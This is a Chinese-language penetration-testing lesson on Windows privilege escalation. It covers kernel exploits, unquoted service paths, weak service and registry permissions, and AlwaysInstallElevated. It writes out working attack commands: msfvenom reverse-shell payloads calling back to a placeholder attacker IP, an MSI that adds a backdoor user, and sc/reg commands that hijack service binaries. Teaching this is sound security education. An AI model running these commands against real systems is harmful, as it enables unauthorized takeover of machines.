#  069：第38天 - Windows权限提升技术详解

在本节课中，我们将系统性地学习Windows环境下的多种权限提升技术。课程内容涵盖从信息收集、漏洞探测到具体利用的完整流程，旨在帮助初学者理解并掌握在获得初始立足点后，如何将普通用户权限提升至系统最高权限。

---

![](img/e0da8077c6e0ded2abc7673f5270aad5_1.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_3.png)

## 📋 课程概述

![](img/e0da8077c6e0ded2abc7673f5270aad5_5.png)

权限提升是渗透测试和后渗透阶段的核心环节。当攻击者获得一个普通用户权限的Shell后，下一步目标通常是获取`SYSTEM`或`Administrator`权限，以完全控制系统。本节课将聚焦于Windows系统，讲解几种常见的提权思路与具体方法。

---

![](img/e0da8077c6e0ded2abc7673f5270aad5_7.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_9.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_11.png)

## 🧠 第一部分：内核漏洞提权

![](img/e0da8077c6e0ded2abc7673f5270aad5_13.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_15.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_17.png)

上一节我们介绍了权限提升的基本概念，本节中我们来看看最直接的提权方式之一：利用Windows内核漏洞。

![](img/e0da8077c6e0ded2abc7673f5270aad5_19.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_21.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_23.png)

内核漏洞提权的核心思路是：**检查目标系统版本和已安装补丁，寻找未修复的已知漏洞**。

![](img/e0da8077c6e0ded2abc7673f5270aad5_25.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_26.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_28.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_30.png)

### 信息收集：检查系统与补丁

首先，我们需要收集目标系统的详细信息，以判断其可能存在的漏洞。

以下是常用的信息收集命令：

![](img/e0da8077c6e0ded2abc7673f5270aad5_32.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_34.png)

*   **`systeminfo`**: 查看系统版本、补丁列表等综合信息。
*   **`wmic qfe get Caption,Description,HotFixID,InstalledOn`**: 列出已安装的补丁。
*   **PowerShell命令**:
    ```powershell
    Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object -Property HotFixID
    ```
    此命令功能与上述`wmic`命令类似，用于枚举系统补丁。

### 使用自动化工具探测漏洞

手动比对补丁信息效率较低，我们可以借助自动化工具来快速识别潜在的提权漏洞。

以下是几款常用的提权辅助工具：

*   **Windows-Exploit-Suggester**: 此工具将`systeminfo`的输出与漏洞数据库比对，给出可能的漏洞利用建议。
*   **Watson**: 一款.NET工具，用于枚举Windows漏洞并给出详细的漏洞信息、利用脚本链接。
*   **Sherlock (PowerShell脚本)**: 一款PowerShell脚本，用于查找本地可能存在的提权漏洞。
    ```powershell
    # 导入并执行Sherlock脚本
    Import-Module .\Sherlock.ps1
    Find-AllVulns
    ```
*   **Metasploit 模块**:
    *   `post/windows/gather/enum_patches`: 枚举系统补丁。
    *   `post/multi/recon/local_exploit_suggester`: 根据当前会话，自动建议可用的本地提权模块。

**核心要点**：这些工具提供的只是“可能性”参考，实际利用需要根据目标环境进行测试。

### 利用公开的漏洞利用代码

当确定目标存在某个特定漏洞（例如，通过CVE编号标识）后，可以在漏洞数据库或代码仓库（如GitHub）中搜索对应的利用代码（Exploit）。

例如，在GitHub上存在专门收集Windows内核提权漏洞的仓库，里面包含了针对不同CVE的编译好的可执行文件（.exe）或源代码。获取到利用程序后，上传至目标机器并执行，通常即可获得`SYSTEM`权限的Shell。

![](img/e0da8077c6e0ded2abc7673f5270aad5_36.png)

**过渡**：内核漏洞提权威力巨大，但高度依赖于未打补丁的特定漏洞。接下来，我们将探讨另一种更依赖系统配置和服务特性的提权方法——服务漏洞提权。

![](img/e0da8077c6e0ded2abc7673f5270aad5_38.png)

---

![](img/e0da8077c6e0ded2abc7673f5270aad5_40.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_42.png)

## ⚙️ 第二部分：Windows服务漏洞提权

![](img/e0da8077c6e0ded2abc7673f5270aad5_44.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_45.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_47.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_49.png)

本节我们将深入分析因Windows服务配置不当而导致的权限提升漏洞。这类漏洞不依赖于未修复的系统补丁，而是利用了服务运行机制和文件权限设置上的缺陷。

![](img/e0da8077c6e0ded2abc7673f5270aad5_51.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_52.png)

### 1. 可信任服务路径漏洞

![](img/e0da8077c6e0ded2abc7673f5270aad5_54.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_56.png)

**漏洞原理**：
Windows服务通常以`SYSTEM`权限运行。当服务启动时，系统会根据服务配置的二进制文件路径来执行程序。如果该路径包含空格（例如 `C:\Program Files\Common Files\service.exe`），且路径中某个空格前的目录对当前用户有写权限，那么漏洞就可能存在。

![](img/e0da8077c6e0ded2abc7673f5270aad5_58.png)

系统在解析带空格的路径时，会依次尝试寻找并执行空格前的名称所对应的程序。例如，对于路径 `C:\Program Files\Common Files\service.exe`，系统会依次尝试执行：
1.  `C:\Program.exe`
2.  `C:\Program Files\Common.exe`
3.  `C:\Program Files\Common Files\service.exe` (最终正确的程序)

![](img/e0da8077c6e0ded2abc7673f5270aad5_60.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_61.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_63.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_65.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_67.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_69.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_70.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_71.png)

**利用条件**：
1.  找到配置路径中包含空格的服务。
2.  该路径中，某个空格前的目录，当前用户具有**写入权限**。

![](img/e0da8077c6e0ded2abc7673f5270aad5_72.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_73.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_75.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_77.png)

**利用步骤**：

![](img/e0da8077c6e0ded2abc7673f5270aad5_79.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_81.png)

以下是完整的利用流程：

![](img/e0da8077c6e0ded2abc7673f5270aad5_83.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_85.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_87.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_89.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_91.png)

1.  **查找易受攻击的服务**：
    ```cmd
    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
    ```
    此命令查找自动启动、且路径不在`C:\Windows\`下、路径中包含空格的服务。

![](img/e0da8077c6e0ded2abc7673f5270aad5_93.png)

2.  **检查目录写入权限**：
    ```cmd
    icacls "C:\Program Files\Vulnerable Directory"
    ```
    检查疑似目录的权限。如果返回结果中包含 `Everyone:(F)` 或当前用户名包含 `(F)`（完全控制），则意味着有写入权限。

![](img/e0da8077c6e0ded2abc7673f5270aad5_95.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_97.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_99.png)

3.  **生成并上传Payload**：
    使用Msfvenom生成一个反向Shell的Payload。
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o Common.exe
    ```
    将生成的`Common.exe`上传到有写权限的目录（例如，如果漏洞路径是 `C:\Program Files\Common Files\service.exe`，且 `C:\Program Files` 可写，则上传到此目录）。

![](img/e0da8077c6e0ded2abc7673f5270aad5_101.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_103.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_105.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_107.png)

4.  **等待或触发服务重启**：
    服务重启时，系统会以`SYSTEM`权限执行我们上传的`Common.exe`。由于普通用户通常无法控制服务重启，可能需要等待系统重启或寻找其他方法。

![](img/e0da8077c6e0ded2abc7673f5270aad5_109.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_110.png)

5.  **接收Shell并迁移进程**：
    成功获得Meterpreter会话后，该会话可能会因为服务进程异常而立即断开。因此，需要在接收到会话的瞬间**自动迁移进程**到一个稳定进程（如`explorer.exe`）。
    在Metasploit的`handler`模块中设置：
    ```bash
    set AutoRunScript post/windows/manage/migrate
    ```
    这样能确保获得一个稳定的`SYSTEM`权限会话。

![](img/e0da8077c6e0ded2abc7673f5270aad5_112.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_114.png)

### 2. 不安全的服务权限

**漏洞原理**：
如果当前用户对某个系统服务的属性拥有**完全控制权**（`SERVICE_ALL_ACCESS`），就可以直接修改该服务启动时执行的二进制文件路径。

![](img/e0da8077c6e0ded2abc7673f5270aad5_116.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_118.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_119.png)

**利用步骤**：

![](img/e0da8077c6e0ded2abc7673f5270aad5_121.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_123.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_125.png)

以下是检查和利用此漏洞的方法：

![](img/e0da8077c6e0ded2abc7673f5270aad5_127.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_129.png)

1.  **使用AccessChk检查服务权限**：
    `AccessChk`是SysInternals工具包中的一款工具。上传并运行以下命令，检查当前用户对哪些服务有`SERVICE_ALL_ACCESS`权限。
    ```cmd
    accesschk.exe -uwcqv "当前用户名" *
    ```
    或者查找所有用户都有完全控制权的服务：
    ```cmd
    accesschk.exe -uwcqv "Everyone" *
    ```

![](img/e0da8077c6e0ded2abc7673f5270aad5_131.png)

2.  **修改服务配置**：
    找到目标服务（例如服务名为`VulnService`）后，使用`sc`命令修改其`binPath`（二进制路径）。
    ```cmd
    sc config VulnService binPath= "C:\path\to\your\payload.exe"
    ```
    **注意**：等号`=`后面必须有一个空格。

![](img/e0da8077c6e0ded2abc7673f5270aad5_133.png)

3.  **启动服务执行Payload**：
    修改后，启动该服务。由于服务以`SYSTEM`运行，它将执行我们的Payload。
    ```cmd
    sc start VulnService
    ```
    同样，如果当前用户权限不足，可能无法启动服务，需要等待或触发重启。

### 3. 不安全的注册表权限

![](img/e0da8077c6e0ded2abc7673f5270aad5_135.png)

**漏洞原理**：
Windows服务的配置信息最终存储在注册表中（路径：`HKLM\SYSTEM\CurrentControlSet\Services\`）。如果当前用户对某个服务对应的注册表项有**写入权限**，就可以直接修改其`ImagePath`键值，达到与上述方法相同的效果。

![](img/e0da8077c6e0ded2abc7673f5270aad5_137.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_139.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_141.png)

**利用步骤**：

以下是利用注册表权限提权的步骤：

1.  **使用SubInACL检查注册表权限**：
    上传`SubInACL`工具，检查对服务注册表项的权限。
    ```cmd
    subinacl.exe /keyreg "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /display
    ```
    如果显示当前用户有 `F` (完全控制) 权限，则可利用。

2.  **修改注册表键值**：
    使用`reg`命令直接修改服务的`ImagePath`。
    ```cmd
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\your\payload.exe" /f
    ```

3.  **重启服务**：
    服务重启后，即会以`SYSTEM`权限执行我们的Payload。

### 4. AlwaysInstallElevated 策略漏洞

**漏洞原理**：
这是一个组策略设置。如果启用，任何用户都可以以**高权限**安装`.msi`格式的安装包。我们可以制作一个包含恶意Payload的`.msi`安装包，诱使或直接运行它来提权。

**利用条件**：
检查以下两个注册表项的值是否为 `1`：
*   `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
*   `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

**检查命令**：
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**利用步骤**：

以下是利用此策略提权的方法：

1.  **生成恶意MSI安装包**：
    使用Msfvenom生成一个直接添加用户的MSI文件，或生成一个执行反向Shell的MSI。
    ```bash
    # 生成添加用户的MSI
    msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o setup.msi
    # 或生成执行反向Shell的MSI (需要先生成payload.exe)
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=5555 -f exe -o payload.exe
    msfvenom -p windows/exec CMD="C:\\Windows\\Temp\\payload.exe" -f msi -o installer.msi
    ```

2.  **上传并执行MSI**：
    将生成的`.msi`文件上传到目标机器，并以普通用户身份运行。
    ```cmd
    msiexec /quiet /qn /i C:\path\to\installer.msi
    ```
    参数说明：`/quiet`和`/qn`表示静默安装，无界面提示。

![](img/e0da8077c6e0ded2abc7673f5270aad5_143.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_145.png)

---

## 📝 课程总结

本节课中我们一起学习了Windows系统下多种关键的权限提升技术：

1.  **内核漏洞提权**：通过信息收集、自动化工具探测，利用未修复的系统内核漏洞直接获取`SYSTEM`权限。这是最经典的提权方式。
2.  **服务路径漏洞提权**：利用Windows解析带空格服务路径的机制，结合可写目录，实现权限提升。
3.  **服务权限漏洞提权**：通过修改当前用户拥有完全控制权的服务配置，替换其启动程序为我们的Payload。
4.  **注册表权限漏洞提权**：原理与服务权限漏洞类似，但操作对象是存储服务配置的注册表项。
5.  **AlwaysInstallElevated策略漏洞**：利用错误的组策略设置，通过高权限安装恶意MSI包进行提权。

![](img/e0da8077c6e0ded2abc7673f5270aad5_147.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_149.png)

![](img/e0da8077c6e0ded2abc7673f5270aad5_151.png)

这些方法各有适用场景，在实际渗透测试中，往往需要结合多种信息收集手段，灵活选用最可能成功的提权路径。掌握这些技术，对于深入理解Windows系统安全性和进行有效的后渗透测试至关重要。